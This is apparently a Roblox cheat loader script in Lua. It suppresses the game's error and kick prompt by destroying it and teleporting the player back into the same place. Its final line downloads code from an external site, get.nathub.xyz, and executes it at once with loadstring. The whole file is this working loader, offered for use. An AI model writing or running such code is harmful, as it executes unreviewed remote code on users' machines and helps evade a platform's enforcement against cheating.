pcall(function()
    game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
        if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
            child:Destroy()
            game:GetService("TeleportService"):Teleport(game.PlaceId)
        end
    end)
end)
loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()
